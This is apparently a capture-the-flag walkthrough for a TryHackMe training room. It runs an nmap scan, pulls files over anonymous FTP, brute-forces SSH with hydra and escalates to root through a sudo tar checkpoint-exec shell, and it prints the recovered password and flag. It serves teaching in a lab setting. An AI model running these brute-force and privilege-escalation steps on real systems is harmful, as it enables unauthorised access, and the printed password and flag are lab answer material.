# Overview
https://tryhackme.com/room/cowboyhacker

```
export IP=10.10.191.59
```

## NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```

## FTP
We can see FTP is open:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.2.44.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```
```
ftp $IP
dir
get lock.txt
get tasks.txt
```

## hyra
For finding passwords
```
hydra -l lin -P lock.txt ssh://$IP
```
Found a password:
```
RedDr4gonSynd1cat3
```
Now we can ssh into the box:
```
ssh lin@$IP
sudo -l
[sudo] password for lin:
RedDr4gonSynd1cat3

Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
So lin can run `tar` as root. Lets find [something](https://gtfobins.github.io/gtfobins/tar/) to get root.
```
lin@bountyhacker:~$ sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
/bin/tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# find / -name root.txt 2> /dev/null
/root/root.txt
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

